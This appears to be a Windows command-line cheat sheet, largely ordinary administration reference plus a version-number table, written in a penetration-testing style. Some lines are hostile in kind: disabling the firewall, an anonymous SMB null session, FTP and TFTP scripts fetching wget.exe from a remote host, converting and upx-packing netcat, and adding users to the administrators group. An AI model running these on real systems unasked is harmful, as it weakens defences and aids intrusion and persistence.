# Windows



### Search

```text
# basics

dir /b /s [dir]\[file]
dir /AH
type [file]

#grepping

findstr file.txt
get-command | select-string blabla
get-content fil.txt | measure-object words
```

### Network

```text
#show all port usage and process id
netstat -nao

#short port usage ever [n] seconds
netstat -nao [n] | find [port]

netstat -s -p [tcp|udp|ip|icmp]

#disable firewall
netsh firewall set opmode disable
```

### SMB

```text
net use
net use \\IP address\IPC$ "" /u:""
net use z: \\192.168.1.101\SYSVOL
net use z: /del
```

### Tasks

```text
#show all running
tasklist

#include dlls
tasklist /m [optional dll]

#show services
tasklist /svc

#kill
taskkill /PID 1234 /F

#service info
sc query
sc qc [service]
```

### wmic

```text
 wmic [alias] [where] [verb]

#aliases
- process
- share
- startup
- service
- nicconfig
- useraccount
- qfe

#where
- where name=""

#verbs
- list
- get
- call
- delete

wmic process list full
```

### File Transfers

```text
#FTP
echo open 192.168.1.101 21> ftp.txt
echo USER asshat>> ftp.txt
echo mysecretpassword>> ftp.txt
echo bin>> ftp.txt
echo GET wget.exe>> ftp.txt
echo bye>> ftp.txt

ftp -v -n -s:ftp.txt

#TFTP
atftpd --daemon --port 69 /tftp
tftp -i 192.160.1.101 GET wget.exe

#debug
#dis assemble nc
wine exe2bat.exe nc.exe nc.txt
upx -9 nc.exe
```

### CMD

```text
#elevate
runas /user:Administrator@DOMAIN

# Restart
shutdown /r /t 0

#show environment
set

#Counting Loop:

for /L %i in
([start],[step],[stop]) do [command]

#Set %i to an initial value of [start] and increment
#it by [step] at every iteration until its value is equal
#to [stop]. For each iteration, run [command]. The
#iterator variable %i can be used anywhere in the
#command to represent its current value.

#Iterate over file contents:

for /F %i in ([file-set]) do
[command]

#Iterate through the contents of the file on a line-by-
#line basis. For each iteration, store the contents of

#the line into %i and run [command].
```

```text
## Users and Groups

``` cmd

# add a user
net user [username] [password] /add

#add to a local group

net localgroup administrators [user] /add
net localgroup users [domainname\username] /add
net localgroup "Remote Desktop Users" [user]  /add

#list users in group
net localgroup [group]
```

### Registry

```text
reg add [\\host\][regdomain]\[key]
reg export [regdomain]\[key] [file]
reg import [filenam]
reg query [\\host\][regdomain]\[key] /v [valuename]
```

### Versions

Desktops

```text
Operating System     Version Number

Windows 1.0                    1.04
Windows 2.0                    2.11
Windows 3.0                    3
Windows NT 3.1                 3.10.528
Windows for Workgroups 3.11    3.11
Windows NT Workstation 3.5     3.5.807
Windows NT Workstation 3.51    3.51.1057
Windows 95                     4.0.950
Windows NT Workstation 4.0     4.0.1381
Windows 98                     4.1.1998
Windows 98 Second Edition      4.1.2222
Windows Me                     4.90.3000
Windows 2000 Professional      5.0.2195
Windows XP                     5.1.2600
Windows Vista                  6.0.6000
Windows 7                      6.1.7600
Windows 8.1                    6.3.9600
Windows 10                     10.0.10240
```

Servers

```text
Windows NT 3.51                  NT 3.51
Windows NT 3.5                   NT 3.50
Windows NT 3.1                   NT 3.10
Windows 2000                     NT 5.0     

    Windows 2000 Server
    Windows 2000 Advanced Server
    Windows 2000 Datacenter Server

Windows NT 4.0                   NT 4.0     

    Windows NT 4.0 Server
    Windows NT 4.0 Server Enterprise
    Windows NT 4.0 Terminal Server Edition

Windows Server 2003              NT 5.2     

    Windows Small Business Server 2003
    Windows Server 2003 Web Edition
    Windows Server 2003 Standard Edition
    Windows Server 2003 Enterprise Edition
    Windows Server 2003 Datacenter Edition
    Windows Storage Server

Windows Server 2003 R2           NT 5.2     

    Windows Small Business Server 2003 R2
    Windows Server 2003 R2 Web Edition
    Windows Server 2003 R2 Standard Edition
    Windows Server 2003 R2 Enterprise Edition
    Windows Server 2003 R2 Datacenter Edition
    Windows Compute Cluster Server 2003 (CCS)
    Windows Storage Server
    Windows Home Server

Windows Server 2008               NT 6.0     

    Windows Server 2008 Standard
    Windows Server 2008 Enterprise
    Windows Server 2008 Datacenter
    Windows Server 2008 for Itanium-based Systems
    Windows Server Foundation 2008
    Windows Essential Business Server 2008
    Windows HPC Server 2008
    Windows Small Business Server 2008
    Windows Storage Server 2008
    Windows Web Server 2008

Windows Server 2008 R2            NT 6.1     

    Windows Server 2008 R2 Foundation
    Windows Server 2008 R2 Standard
    Windows Server 2008 R2 Enterprise
    Windows Server 2008 R2 Datacenter
    Windows Server 2008 R2 for Itanium-based Systems
    Windows Web Server 2008 R2
    Windows Storage Server 2008 R2
    Windows HPC Server 2008 R2
    Windows Small Business Server 2011
    Windows MultiPoint Server 2011
    Windows Home Server 2011
    Windows MultiPoint Server 2010

Windows Server 2012               NT 6.2     

    Windows Server 2012 Foundation
    Windows Server 2012 Essentials
    Windows Server 2012 Standard
    Windows Server 2012 Datacenter
    Windows MultiPoint Server 2012

Windows Server 2012 R2            NT 6.3     

    Windows Server 2012 R2 Foundation
    Windows Server 2012 R2 Essentials
    Windows Server 2012 R2 Standard
    Windows Server 2012 R2 Datacenter

Windows Server 2016     2016       NT 10.0
```

